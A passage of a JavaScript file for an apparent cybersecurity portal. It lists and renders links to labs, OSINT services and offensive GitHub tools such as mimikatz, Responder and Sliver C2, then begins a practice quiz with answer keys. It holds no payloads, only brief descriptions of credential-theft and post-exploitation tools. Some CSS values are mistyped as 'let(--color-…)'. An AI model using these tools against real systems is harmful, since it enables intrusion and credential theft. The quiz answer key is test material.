    { name: "PhishTank", desc: "Collaborative clearinghouse and community tracker of active phishing URLs and reports.", category: "intel", type: "Phishing Database", url: "https://www.phishtank.com/" },
    { name: "IPVoid / DNSVoid", desc: "Network utilities for checking IP address blacklists, reputation, and DNS health.", category: "intel", type: "IP Reputation", url: "https://www.ipvoid.com/" },
    
    { name: "PortSwigger Web Security Academy", desc: "The gold standard for interactive web application security labs and tutorials.", category: "labs", type: "Interactive Labs", url: "https://portswigger.net/web-security" },
    { name: "Hack The Box", desc: "Gamified learning labs simulating machines, active directories, and CTF challenges.", category: "labs", type: "PenTest Labs", url: "https://www.hackthebox.com/" },
    { name: "TryHackMe", desc: "Path-guided cybersecurity lab platform perfect for beginners and intermediate learners.", category: "labs", type: "Guided Labs", url: "https://tryhackme.com/" },
    
    { name: "The Hacker News", desc: "Leading real-time cybersecurity news portal reporting on active vulnerabilities and breaches.", category: "news", type: "News Portal", url: "https://thehackernews.com/" },
    { name: "Bleeping Computer", desc: "High-quality news reporting on malware campaigns, ransomware, and technology updates.", category: "news", type: "News & Forums", url: "https://www.bleepingcomputer.com/" },
    { name: "Krebs on Security", desc: "Investigative cybercrime research blog by leading security journalist Brian Krebs.", category: "news", type: "Investigative Blog", url: "https://krebsonsecurity.com/" },
    
    { name: "Mitre ATT&CK Framework", desc: "Globally-accessible knowledge base of adversary tactics, techniques, and procedures.", category: "standards", type: "TTP Framework", url: "https://attack.mitre.org/" },
    { name: "OWASP Project Top 10", desc: "The standard awareness document for web application security vulnerabilities.", category: "standards", type: "Web Security Standard", url: "https://owasp.org/www-project-top-ten/" },
    
    { name: "CyberChef (GCHQ)", desc: "The cyber Swiss Army Knife. Web tool for encoding, encrypting, and data manipulation.", category: "tools", type: "Web Utility Tool", url: "https://gchq.github.io/CyberChef/" },
    { name: "Kaspersky Cyberthreat Map", desc: "Stunning real-time interactive global map showing active antivirus and intrusion detections.", category: "tools", type: "Visualizer Map", url: "https://cybermap.kaspersky.com/" }
];

const portalGrid = document.getElementById('portal-cards-grid');
const portalSearchInput = document.getElementById('hacker-portal-search');
const clearPortalSearchBtn = document.getElementById('clear-portal-search');
const portalNoResults = document.getElementById('portal-no-results');
const portalNoResultsText = document.getElementById('portal-no-results-text');
const portalGoogleFallbackLink = document.getElementById('portal-google-fallback-link');
const portalFilterChips = document.querySelectorAll('[data-portal-filter]');

let activePortalFilter = 'all';

function renderHackerPortal() {
    if (!portalGrid) return;
    const query = portalSearchInput.value.trim().toLowerCase();
    portalGrid.innerHTML = '';
    
    // Toggle clear button
    if (query.length > 0) {
        clearPortalSearchBtn.style.display = 'flex';
    } else {
        clearPortalSearchBtn.style.display = 'none';
    }

    let visibleCount = 0;

    hackerPortalData.forEach(site => {
        const matchesCategory = (activePortalFilter === 'all' || site.category === activePortalFilter);
        
        const nameLower = site.name.toLowerCase();
        const descLower = site.desc.toLowerCase();
        const typeLower = site.type.toLowerCase();
        
        const matchesName = nameLower.includes(query);
        const matchesDesc = descLower.includes(query);
        const matchesType = typeLower.includes(query);

        if (matchesCategory && (matchesName || matchesDesc || matchesType)) {
            visibleCount++;
            
            // Highlight logic
            let highlightedName = site.name;
            let highlightedDesc = site.desc;
            
            if (query) {
                const escapedQuery = escapeSearchRegex(query);
                const regex = new RegExp(`(${escapedQuery})`, 'gi');
                highlightedName = site.name.replace(regex, '<span class="highlight">$1</span>');
                highlightedDesc = site.desc.replace(regex, '<span class="highlight">$1</span>');
            }

            const card = document.createElement('div');
            card.className = 'channel-card';
            card.innerHTML = `
                <span class="channel-badge">${site.type}</span>
                <h3>${highlightedName}</h3>
                <p>${highlightedDesc}</p>
                <a href="${site.url}" target="_blank" rel="noopener" class="channel-btn" style="margin-top: auto;">
                    <svg viewBox="0 0 24 24"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41 9.83-9.83V9h2V3h-6z"/></svg> Visit Website
                </a>
            `;
            portalGrid.appendChild(card);
        }
    });

    // Toggle no results
    if (visibleCount === 0) {
        portalNoResults.style.display = 'block';
        if (query.length > 0) {
            portalNoResultsText.textContent = `No portal links found matching "${portalSearchInput.value}".`;
            portalGoogleFallbackLink.href = `https://www.google.com/search?q=${encodeURIComponent(portalSearchInput.value + ' cybersecurity website')}`;
            portalGoogleFallbackLink.style.display = 'inline-flex';
        } else {
            portalNoResultsText.textContent = `No portal links found in this category.`;
            portalGoogleFallbackLink.style.display = 'none';
        }
    } else {
        portalNoResults.style.display = 'none';
    }
}

if (portalSearchInput) {
    portalSearchInput.addEventListener('input', renderHackerPortal);
}
if (clearPortalSearchBtn) {
    clearPortalSearchBtn.addEventListener('click', () => {
        portalSearchInput.value = '';
        renderHackerPortal();
        portalSearchInput.focus();
    });
}

portalFilterChips.forEach(chip => {
    chip.addEventListener('click', () => {
        portalFilterChips.forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        activePortalFilter = chip.getAttribute('data-portal-filter');
        renderHackerPortal();
    });
});

// Initial render call
renderHackerPortal();

// ================================
// OSINT Tools Interactive Engine
// ================================
const osintToolsData = [
    { name: "OSINT Framework", desc: "Interactive directory of open-source intelligence web services and search linkages.", category: "recon", type: "Framework Directory", url: "https://osintframework.com/" },
    { name: "Wappalyzer", desc: "Browser extension and web profiler that discovers what software technologies are running on a site.", category: "recon", type: "Tech Stack Lookup", url: "https://www.wappalyzer.com/" },
    { name: "BuiltWith", desc: "Detailed technology lookup engine detailing content management, hosting, and script metrics.", category: "recon", type: "Tech Stack Lookup", url: "https://builtwith.com/" },
    { name: "Google Hacking Database", desc: "Database of advanced search operator dorks (GHDB) for indexing hidden site details.", category: "recon", type: "Dorking Reference", url: "https://www.exploit-db.com/google-hacking-database" },
    
    { name: "Sherlock Project", desc: "Find profiles on social networks using a single username across 400+ platforms.", category: "social", type: "Username Search", url: "https://github.com/sherlock-project/sherlock" },
    { name: "Social Searcher", desc: "Real-time search engine for tracking hashtags, usernames, and posts across social media.", category: "social", type: "Social Media Search", url: "https://social-searcher.com/" },
    
    { name: "Hunter.io", desc: "Search engine to discover email formats and individual contact listings for any business domain.", category: "discovery", type: "Email Finder", url: "https://hunter.io/" },
    { name: "Phonebook.cz", desc: "Highly useful OSINT tool listing emails, subdomains, and directories for a query domain.", category: "discovery", type: "Subdomain & Email", url: "https://phonebook.cz/" },
    { name: "DNSDumpster", desc: "DNS research lookup utility for discovering subdomains, MX records, and server ranges.", category: "discovery", type: "DNS Recon", url: "https://dnsdumpster.com/" },
    { name: "crt.sh", desc: "Search tool queries public Certificate Transparency logs for subdomains and certificate owners.", category: "discovery", type: "Certificate Search", url: "https://crt.sh/" },
    { name: "theHarvester", desc: "Command-line scanner to gather public emails, names, subdomains, and hosts using search engines.", category: "discovery", type: "Active Scanner", url: "https://github.com/laramies/theHarvester" },
    { name: "MxToolbox", desc: "DNS health, blacklist status, MX record routing, and diagnostic utility set.", category: "discovery", type: "DNS Diagnostics", url: "https://mxtoolbox.com/" },
    { name: "Email Hippo", desc: "E-mail address validation tool to verify active status and syntax errors.", category: "discovery", type: "Email Validator", url: "https://emailhippo.com/" },
    
    { name: "Intelligence X (IntelX)", desc: "Search engine indexing archived darknet leaks, paste sites, and historical page records.", category: "leaks", type: "Leak Search Engine", url: "https://intelx.io/" },
    { name: "Have I Been Pwned", desc: "Credential leak verification platform to verify email compromises in breaches.", category: "leaks", type: "Leak Reference", url: "https://haveibeenpwned.com/" },
    { name: "Wayback Machine", desc: "Internet archive indexing historical, deleted, and modified versions of webpages over decades.", category: "leaks", type: "Web Archive", url: "https://archive.org/" },
    
    { name: "Maltego", desc: "Interactive intelligence link analysis mapping relationships between hosts, domains, and individuals.", category: "scanners", type: "Link Analysis Tool", url: "https://www.maltego.com/" },
    { name: "SpiderFoot", desc: "Automated OSINT collection scanner extracting threat intelligence over 100+ public sources.", category: "scanners", type: "OSINT Scanner", url: "https://www.spiderfoot.net/" },
    { name: "Urlscan.io", desc: "Automated web service scanner rendering outbound API calls, cookies, and page captures.", category: "scanners", type: "URL Sandbox Scan", url: "https://urlscan.io/" },
    
    { name: "TinEye", desc: "Reverse image search engine indexing image variations, crop edits, and original uploads.", category: "metadata", type: "Reverse Image", url: "https://tineye.com/" },
    { name: "ExifTool", desc: "Read, write, and manipulate metadata profiles (EXIF, IPTC) inside images, PDFs, and media.", category: "metadata", type: "Metadata Reader", url: "https://exiftool.org/" },
    
    { name: "WiGle Wireless Database", desc: "Global wardriving database tracking coordinates of wireless networks, cell towers, and APs.", category: "network", type: "Wireless Maps", url: "https://wigle.net/" },
    { name: "CentralOps", desc: "Domain investigator utility for quick Whois lookup, DNS query, and connection hops.", category: "network", type: "Domain Lookup", url: "https://centralops.net/" },
    { name: "ViewDNS.info", desc: "Excellent collection of reverse IP lookups, Whois historical checks, and DNS diagnostics.", category: "network", type: "DNS Lookup Set", url: "https://viewdns.info/" }
];

const osintGrid = document.getElementById('osint-cards-grid');
const osintSearchInput = document.getElementById('osint-tools-search');
const clearOsintSearchBtn = document.getElementById('clear-osint-search');
const osintNoResults = document.getElementById('osint-no-results');
const osintNoResultsText = document.getElementById('osint-no-results-text');
const osintGoogleFallbackLink = document.getElementById('osint-google-fallback-link');
const osintFilterChips = document.querySelectorAll('[data-osint-filter]');

let activeOsintFilter = 'all';

function renderOsintTools() {
    if (!osintGrid) return;
    const query = osintSearchInput.value.trim().toLowerCase();
    osintGrid.innerHTML = '';
    
    // Toggle clear button
    if (query.length > 0) {
        clearOsintSearchBtn.style.display = 'flex';
    } else {
        clearOsintSearchBtn.style.display = 'none';
    }

    let visibleCount = 0;

    osintToolsData.forEach(tool => {
        const matchesCategory = (activeOsintFilter === 'all' || tool.category === activeOsintFilter);
        
        const nameLower = tool.name.toLowerCase();
        const descLower = tool.desc.toLowerCase();
        const typeLower = tool.type.toLowerCase();
        
        const matchesName = nameLower.includes(query);
        const matchesDesc = descLower.includes(query);
        const matchesType = typeLower.includes(query);

        if (matchesCategory && (matchesName || matchesDesc || matchesType)) {
            visibleCount++;
            
            // Highlight logic
            let highlightedName = tool.name;
            let highlightedDesc = tool.desc;
            
            if (query) {
                const escapedQuery = escapeSearchRegex(query);
                const regex = new RegExp(`(${escapedQuery})`, 'gi');
                highlightedName = tool.name.replace(regex, '<span class="highlight">$1</span>');
                highlightedDesc = tool.desc.replace(regex, '<span class="highlight">$1</span>');
            }

            const card = document.createElement('div');
            card.className = 'channel-card';
            card.innerHTML = `
                <span class="channel-badge" style="background: rgba(0, 255, 204, 0.06); border-color: rgba(0, 255, 204, 0.2); color: let(--color-pink);">${tool.type}</span>
                <h3>${highlightedName}</h3>
                <p>${highlightedDesc}</p>
                <a href="${tool.url}" target="_blank" rel="noopener" class="channel-btn" style="margin-top: auto;">
                    <svg viewBox="0 0 24 24"><path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41 9.83-9.83V9h2V3h-6z"/></svg> Visit Tool
                </a>
            `;
            osintGrid.appendChild(card);
        }
    });

    // Toggle no results
    if (visibleCount === 0) {
        osintNoResults.style.display = 'block';
        if (query.length > 0) {
            osintNoResultsText.textContent = `No OSINT tools found matching "${osintSearchInput.value}".`;
            osintGoogleFallbackLink.href = `https://www.google.com/search?q=${encodeURIComponent(osintSearchInput.value + ' osint tool')}`;
            osintGoogleFallbackLink.style.display = 'inline-flex';
        } else {
            osintNoResultsText.textContent = `No OSINT tools found in this category.`;
            osintGoogleFallbackLink.style.display = 'none';
        }
    } else {
        osintNoResults.style.display = 'none';
    }
}

if (osintSearchInput) {
    osintSearchInput.addEventListener('input', renderOsintTools);
}
if (clearOsintSearchBtn) {
    clearOsintSearchBtn.addEventListener('click', () => {
        osintSearchInput.value = '';
        renderOsintTools();
        osintSearchInput.focus();
    });
}

osintFilterChips.forEach(chip => {
    chip.addEventListener('click', () => {
        osintFilterChips.forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        activeOsintFilter = chip.getAttribute('data-osint-filter');
        renderOsintTools();
    });
});

// Initial render call
renderOsintTools();

// ================================
// GitHub Scripts Interactive Engine
// ================================
const gitScriptsData = [
    { name: "SecLists", desc: "The ultimate wordlist companion. Essential lists of usernames, passwords, URLs, sensitive data patterns, and fuzzing payloads.", category: "payloads", type: "Wordlists", url: "https://github.com/danielmiessler/SecLists", lang: "PHP", stars: "61.2k", forks: "14.8k" },
    { name: "PayloadsAllTheThings", desc: "A massive, daily-updated cheat sheet directory of web application payloads, payloads for SQLi, XSS, SSRF, LFI, and shell injections.", category: "payloads", type: "Payload Bypasses", url: "https://github.com/swisskyrepo/PayloadsAllTheThings", lang: "Python", stars: "59.8k", forks: "15.2k" },
    { name: "OWASP CheatSheet Series", desc: "Curated defense-focused implementation cheat sheets for application security developers and engineers.", category: "payloads", type: "Security Standards", url: "https://github.com/OWASP/CheatSheetSeries", lang: "HTML", stars: "28.5k", forks: "4.9k" },
    
    { name: "PEASS-ng Suite", desc: "Privilege Escalation Awesome Scripts Suite (LinPEAS for Linux and WinPEAS for Windows). Performs deep OS scanning to find escalation paths.", category: "privesc", type: "PrivEsc Scripts", url: "https://github.com/peass-ng/PEASS-ng", lang: "Shell", stars: "18.3k", forks: "3.5k" },
    { name: "LinEnum", desc: "Scripted local Linux privilege escalation checklist utility. Quick shell script for target footprinting.", category: "privesc", type: "Local Enum Shell", url: "https://github.com/rebootuser/LinEnum", lang: "Shell", stars: "5.1k", forks: "1.2k" },
    
    { name: "BloodHound", desc: "Active Directory relationship mapping tool using graph theory to identify complex exploit chains and domain admin paths.", category: "ad", type: "Active Directory Graph", url: "https://github.com/BloodHoundAD/BloodHound", lang: "TypeScript", stars: "10.4k", forks: "2.1k" },
    { name: "Sliver C2", desc: "Advanced cross-platform Red Team implant framework (command and control) supporting DNS, HTTP, and WireGuard beacons.", category: "ad", type: "C2 Framework", url: "https://github.com/bishopfox/sliver", lang: "Go", stars: "8.2k", forks: "1.4k" },
    { name: "CrackMapExec", desc: "Modular post-exploitation toolkit to automate security assessments of large Active Directory networks.", category: "ad", type: "AD Post-Exploitation", url: "https://github.com/byt3bl33d3r/CrackMapExec", lang: "Python", stars: "8.9k", forks: "2.2k" },
    { name: "Impacket", desc: "Collection of Python classes for working with low-level network protocols. Powers many Windows network exploits.", category: "ad", type: "Protocol Libraries", url: "https://github.com/fortra/impacket", lang: "Python", stars: "13.1k", forks: "3.2k" },
    
    { name: "mimikatz", desc: "Credential harvesting tool extracting plain text passwords, hash tickets, and PINs from Windows LSASS memory.", category: "exploits", type: "Memory Dumping Tool", url: "https://github.com/gentilkiwi/mimikatz", lang: "C", stars: "41.6k", forks: "8.5k" },
    { name: "Responder", desc: "LLMNR, NBT-NS, and MDNS packet poisoner. Spawns rogue authentication servers to capture network hashes.", category: "exploits", type: "Network Poisoner", url: "https://github.com/lgandrelle/Responder", lang: "Python", stars: "4.8k", forks: "1.3k" },
    { name: "Evil-WinRM", desc: "The ultimate WinRM shell interface for establishing remote administration access on Windows pentest targets.", category: "exploits", type: "Shell Access", url: "https://github.com/Hackplayers/evil-winrm", lang: "Ruby", stars: "4.2k", forks: "940" },
    { name: "metasploit-framework", desc: "Official repository of Metasploit, the world's most widely used exploitation and penetration testing software.", category: "exploits", type: "Exploit Framework", url: "https://github.com/rapid7/metasploit-framework", lang: "Ruby", stars: "35.1k", forks: "13.6k" },
    
    { name: "dirsearch", desc: "Command-line recursive web directory and file fuzzer with advanced request filtering and multithreading.", category: "fuzzers", type: "Web Fuzzer", url: "https://github.com/maurosoria/dirsearch", lang: "Python", stars: "12.8k", forks: "2.9k" },
    { name: "ffuf (Fuzz Faster U Fool)", desc: "Blazing fast web directory, VHost, and parameter fuzzer written in Go. Very popular in bug bounty hunting.", category: "fuzzers", type: "Go Fuzzer", url: "https://github.com/ffuf/ffuf", lang: "Go", stars: "10.9k", forks: "1.8k" },
    { name: "sqlmap", desc: "Automatic SQL injection detection, extraction, and database takeover automation script.", category: "fuzzers", type: "Exploit Automation", url: "https://github.com/sqlmapproject/sqlmap", lang: "Python", stars: "31.5k", forks: "8.1k" },
    { name: "gobuster", desc: "Directory/file fuzzer, DNS subdomain buster, and virtual host discovery script written in Go.", category: "fuzzers", type: "Go Fuzzer", url: "https://github.com/OJ/gobuster", lang: "Go", stars: "10.2k", forks: "1.9k" },
    { name: "wfuzz", desc: "Flexible web application vulnerability fuzzer allowing injection of payloads in any HTTP parameter.", category: "fuzzers", type: "Web Fuzzer", url: "https://github.com/xmendez/wfuzz", lang: "Python", stars: "5.4k", forks: "1.3k" },
    
    { name: "sherlock", desc: "Find profiles on social networks using a single username across 400+ platforms.", category: "intel", type: "Username Recon", url: "https://github.com/sherlock-project/sherlock", lang: "Python", stars: "52.4k", forks: "6.2k" },
    { name: "theHarvester", desc: "Active and passive recon tool collecting email formats, subdomains, and hostnames from public databases.", category: "intel", type: "Passive Recon", url: "https://github.com/laramies/theHarvester", lang: "Python", stars: "8.4k", forks: "2.1k" },
    { name: "AutoRecon", desc: "Multi-threaded network reconnaissance tool performing automated port scanning and service enumeration.", category: "intel", type: "Auto Scanner", url: "https://github.com/Tib3rius/AutoRecon", lang: "Python", stars: "4.2k", forks: "980" },
    { name: "nmap", desc: "Official repository for Nmap, the standard command line utility for network discovery and security scanning.", category: "intel", type: "Port Scanner", url: "https://github.com/nmap/nmap", lang: "C", stars: "10.8k", forks: "2.7k" },
    
    { name: "Awesome Pentest", desc: "Curated list of awesome penetration testing resources, tools, frameworks, and books on GitHub.", category: "directories", type: "Awesome List", url: "https://github.com/enaqx/awesome-pentest", lang: "Markdown", stars: "21.6k", forks: "4.2k" },
    { name: "Social-Engineer Toolkit (SET)", desc: "Open-source penetration testing framework designed for executing custom social engineering attacks.", category: "directories", type: "Attack Framework", url: "https://github.com/trustedsec/social-engineer-toolkit", lang: "Python", stars: "9.2k", forks: "2.4k" },
    
    { name: "PwnTools", desc: "Exploit development library and CTF framework written in Python. Essential for custom exploit creation and binary analyses.", category: "advanced", type: "Exploit Dev Lib", url: "https://github.com/Gallopsled/pwntools", lang: "Python", stars: "11.2k", forks: "2.5k" },
    { name: "Rubeus", desc: "C# toolset for raw Kerberos interaction and abuses (Kerberoasting, AS-REP roasting, ticket attacks).", category: "advanced", type: "AD Kerberos Abuse", url: "https://github.com/GhostPack/Rubeus", lang: "C#", stars: "4.8k", forks: "990" },
    { name: "Seatbelt", desc: "C# project that performs local security checks and host defense reviews during engagements.", category: "advanced", type: "Host Audit Tool", url: "https://github.com/GhostPack/Seatbelt", lang: "C#", stars: "3.2k", forks: "720" },
    { name: "Certipy", desc: "Active Directory Certificate Services (AD CS) enumeration and exploitation tool to abuse AD certificates.", category: "advanced", type: "AD CS Exploit", url: "https://github.com/ly4k/Certipy", lang: "Python", stars: "2.5k", forks: "480" },
    { name: "Chisel", desc: "A fast TCP/UDP tunnel, written in Go, over HTTP. Indispensable for internal pivoting and network tunneling.", category: "advanced", type: "HTTP Tunneling", url: "https://github.com/jpillora/chisel", lang: "Go", stars: "12.4k", forks: "2.1k" },
    { name: "Ligolo-ng", desc: "Advanced tunneling and network pivoting tool utilizing a TUN interface to route entire subnet ranges.", category: "advanced", type: "TUN Pivoting", url: "https://github.com/nicocha30/ligolo-ng", lang: "Go", stars: "3.8k", forks: "650" },
    { name: "Nuclei Scanner", desc: "Fast, template-based vulnerability and exploit scanner driven by custom YAML templates.", category: "advanced", type: "Template Scanner", url: "https://github.com/projectdiscovery/nuclei", lang: "Go", stars: "18.5k", forks: "2.6k" },
    { name: "Subfinder", desc: "High-speed passive subdomain discovery tool written in Go, aggregating multiple search APIs.", category: "advanced", type: "Subdomain Recon", url: "https://github.com/projectdiscovery/subfinder", lang: "Go", stars: "4.9k", forks: "810" },
    { name: "Katana Crawler", desc: "Next-generation web crawler and spidering framework for high-concurrency URL discovery.", category: "advanced", type: "Web Crawler", url: "https://github.com/projectdiscovery/katana", lang: "Go", stars: "3.1k", forks: "420" },
    { name: "SharpHound", desc: "C# data collector/ingestor for BloodHound. Performs Active Directory object enumeration.", category: "advanced", type: "BloodHound Ingestor", url: "https://github.com/BloodHoundAD/SharpHound", lang: "C#", stars: "1.9k", forks: "380" },
    { name: "NetExec", desc: "The active, community-driven successor to CrackMapExec for network security assessments and Active Directory audits.", category: "advanced", type: "Network Security Auditor", url: "https://github.com/Pennyw0rth/NetExec", lang: "Python", stars: "2.2k", forks: "450" },
    { name: "Karkinos", desc: "Lightweight, web-based pentest Swiss Army knife containing encoders, decoders, and hash crackers.", category: "advanced", type: "Lightweight Toolkit", url: "https://github.com/dustyfresh/karkinos", lang: "JavaScript", stars: "1.1k", forks: "210" }
]

const gitGrid = document.getElementById('git-cards-grid');
const gitSearchInput = document.getElementById('git-scripts-search');
const clearGitSearchBtn = document.getElementById('clear-git-search');
const gitNoResults = document.getElementById('git-no-results');
const gitNoResultsText = document.getElementById('git-no-results-text');
const gitGoogleFallbackLink = document.getElementById('git-google-fallback-link');
const gitFilterChips = document.querySelectorAll('[data-git-filter]');

let activeGitFilter = 'all';

function renderGitScripts() {
    if (!gitGrid) return;
    const query = gitSearchInput.value.trim().toLowerCase();
    gitGrid.innerHTML = '';
    
    // Toggle clear button
    if (query.length > 0) {
        clearGitSearchBtn.style.display = 'flex';
    } else {
        clearGitSearchBtn.style.display = 'none';
    }

    let visibleCount = 0;

    gitScriptsData.forEach(repo => {
        const matchesCategory = (activeGitFilter === 'all' || repo.category === activeGitFilter);
        
        const nameLower = repo.name.toLowerCase();
        const descLower = repo.desc.toLowerCase();
        const typeLower = repo.type.toLowerCase();
        
        const matchesName = nameLower.includes(query);
        const matchesDesc = descLower.includes(query);
        const matchesType = typeLower.includes(query);

        if (matchesCategory && (matchesName || matchesDesc || matchesType)) {
            visibleCount++;
            
            // Highlight logic
            let highlightedName = repo.name;
            let highlightedDesc = repo.desc;
            
            if (query) {
                const escapedQuery = escapeSearchRegex(query);
                const regex = new RegExp(`(${escapedQuery})`, 'gi');
                highlightedName = repo.name.replace(regex, '<span class="highlight">$1</span>');
                highlightedDesc = repo.desc.replace(regex, '<span class="highlight">$1</span>');
            }

            const card = document.createElement('div');
            card.className = 'channel-card';
            card.innerHTML = `
                <span class="channel-badge git-badge">${repo.type}</span>
                <h3>${highlightedName}</h3>
                <p>${highlightedDesc}</p>
                
                <div class="repo-meta-row">
                    <span class="repo-stat-item">
                        <span class="repo-lang-dot" style="background-color: ${getLangColor(repo.lang)};"></span>
                        ${repo.lang}
                    </span>
                    <span class="repo-stat-item" title="Stars">
                        <svg class="repo-stat-icon" viewBox="0 0 24 24"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
                        ${repo.stars}
                    </span>
                    <span class="repo-stat-item" title="Forks">
                        <svg class="repo-stat-icon" viewBox="0 0 24 24"><path d="M18 17c0-1.1-.9-2-2-2h-3v-4h1c1.65 0 3-1.35 3-3V6c0-1.65-1.35-3-3-3s-3 1.35-3 3v2c0 1.65 1.35 3 3 3h1v4h-3c-1.1 0-2-.9-2-2v-3.2c.7-.5 1.2-1.3 1.2-2.2C13.2 5.5 11.7 4 10 4S6.8 5.5 6.8 7.2c0 .9.5 1.7 1.2 2.2V15c0 1.65 1.35 3 3 3h3v2.2c-.7.5-1.2 1.3-1.2 2.2 0 1.7 1.4 3.1 3.2 3.1s3.2-1.4 3.2-3.1c0-.9-.5-1.7-1.2-2.2V17z"/></svg>
                        ${repo.forks}
                    </span>
                </div>
                
                <div class="git-card-actions">
                    <a href="${repo.url}" target="_blank" rel="noopener" class="channel-btn git-view-btn">
                        <svg viewBox="0 0 24 24" style="width: 14px; height: 14px; fill: currentColor;"><path d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34-.46-1.16-1.11-1.47-1.11-1.47-.9-.62.07-.6.07-.6 1 .07 1.53 1.03 1.53 1.03.9 1.52 2.34 1.07 2.91.83.09-.65.35-1.09.63-1.34-2.22-.25-4.55-1.11-4.55-4.92 0-1.11.38-2 1.03-2.71-.08-.25-.45-1.29.1-2.64 0 0 .84-.27 2.75 1.02.79-.22 1.65-.33 2.5-.33.85 0 1.71.11 2.5.33 1.91-1.29 2.75-1.02 2.75-1.02.55 1.35.18 2.39.1 2.64.65.71 1.03 1.6 1.03 2.71 0 3.82-2.34 4.66-4.57 4.91.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2z"/></svg> View Repo
                    </a>
                    <button class="git-clone-btn" onclick="copyCloneCommand('${repo.url}', this)" title="Copy git clone command">
                        <svg viewBox="0 0 24 24" style="width: 14px; height: 14px; fill: currentColor;"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg> Clone
                    </button>
                </div>
            `;
            gitGrid.appendChild(card);
        }
    });

    // Toggle no results
    if (visibleCount === 0) {
        gitNoResults.style.display = 'block';
        if (query.length > 0) {
            gitNoResultsText.textContent = `No repositories found matching "${gitSearchInput.value}".`;
            gitGoogleFallbackLink.href = `https://github.com/search?q=${encodeURIComponent(gitSearchInput.value + ' hacking')}`;
            gitGoogleFallbackLink.style.display = 'inline-flex';
        } else {
            gitNoResultsText.textContent = `No repositories found in this category.`;
            gitGoogleFallbackLink.style.display = 'none';
        }
    } else {
        gitNoResults.style.display = 'none';
    }
}

function getLangColor(lang) {
    const colors = {
        "Python": "#3572A5",
        "Go": "#00ADD8",
        "C#": "#178600",
        "C": "#555555",
        "C++": "#f34b7d",
        "Ruby": "#701516",
        "Shell": "#89e051",
        "TypeScript": "#3178c6",
        "JavaScript": "#f1e05a",
        "HTML": "#e34c26",
        "PHP": "#4F5D95",
        "Markdown": "#083fa1"
    };
    return colors[lang] || "#8b5cf6";
}

function copyCloneCommand(url, btn) {
    const cloneCmd = `git clone ${url}.git`;
    navigator.clipboard.writeText(cloneCmd).then(() => {
        const originalText = btn.innerHTML;
        btn.innerHTML = `<svg viewBox="0 0 24 24" style="width: 14px; height: 14px; fill: let(--color-success);"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Copied!`;
        btn.style.borderColor = 'let(--color-success)';
        btn.style.color = 'let(--color-success)';
        setTimeout(() => {
            btn.innerHTML = originalText;
            btn.style.borderColor = '';
            btn.style.color = '';
        }, 1500);
    }).catch(err => {
        console.error('Failed to copy text: ', err);
    });
}

if (gitSearchInput) {
    gitSearchInput.addEventListener('input', renderGitScripts);
}
if (clearGitSearchBtn) {
    clearGitSearchBtn.addEventListener('click', () => {
        gitSearchInput.value = '';
        renderGitScripts();
        gitSearchInput.focus();
    });
}

gitFilterChips.forEach(chip => {
    chip.addEventListener('click', () => {
        gitFilterChips.forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        activeGitFilter = chip.getAttribute('data-git-filter');
        renderGitScripts();
    });
});

// --- PRACTICE EXAM QUIZ ENGINE ---
const quizQuestions = [
    {
        q: "What vulnerability occurs when user input is sent to an interpreter without sanitization, allowing malicious commands to execute?",
        options: ["Cross-Site Request Forgery (CSRF)", "Injection Attacks (SQLi, Command Injection)", "Session Hijacking", "Man-in-the-Middle (MitM)"],
        correct: 1,
        cat: "web",
        domain: "Web Attacks",
        exp: "Injection attacks occur when untrusted user input is passed directly to an interpreter (SQL, OS, LDAP, etc.) without filtering. The interpreter executes the user input as code, letting attackers override query logic or execute commands."
    },
    {
        q: "Which Nmap scan flag performs a TCP SYN scan, also known as a half-open or stealth scan?",
        options: ["-sT (TCP Connect)", "-sS (TCP SYN)", "-sU (UDP Scan)", "-sA (ACK Scan)"],
        correct: 1,
        cat: "network",
        domain: "Network & Recon",
        exp: "The -sS flag instructs Nmap to perform a TCP SYN stealth scan. It is 'stealthy' because it never completes the full TCP three-way handshake (sends SYN, waits for SYN-ACK, then sends RST instead of ACK), avoiding logging by simple hosts."
    },
    {
        q: "If Alice wants to encrypt a message to Bob using asymmetric cryptography to guarantee confidentiality, which key does she use?",
        options: ["Alice's Private Key", "Alice's Public Key", "Bob's Public Key", "Bob's Private Key"],
        correct: 2,
        cat: "crypto",
        domain: "Cryptography",
        exp: "To send a confidential message, Alice encrypts it using Bob's Public Key. Since Bob's Public Key is public, anyone can use it to encrypt messages, but only Bob's corresponding Private Key can decrypt it, ensuring confidentiality."
    },
    {
        q: "Which credential harvesting and pass-the-hash tool is famous for extracting cleartext passwords and Kerberos tickets from Windows LSASS memory?",
        options: ["Wireshark", "John the Ripper", "Mimikatz", "Hydra"],
        correct: 2,
        cat: "systems",
        domain: "Systems & AD",
        exp: "Mimikatz is a powerful post-exploitation tool written in C by Benjamin Delpy. It exploits Windows authentication mechanics to extract cleartext passwords, PINs, hashes, and Kerberos tickets from the Local Security Authority Subsystem Service (LSASS) memory space."
    },
    {
        q: "What is the primary mitigation against Cross-Site Scripting (XSS) vulnerabilities?",
        options: ["Implementing CAPTCHA verification", "Context-aware Output Encoding & Content Security Policy (CSP)", "Using SSL/TLS HTTPS certificates", "Applying complex HTTPOnly session cookies"],
        correct: 1,
        cat: "web",
        domain: "Web Attacks",
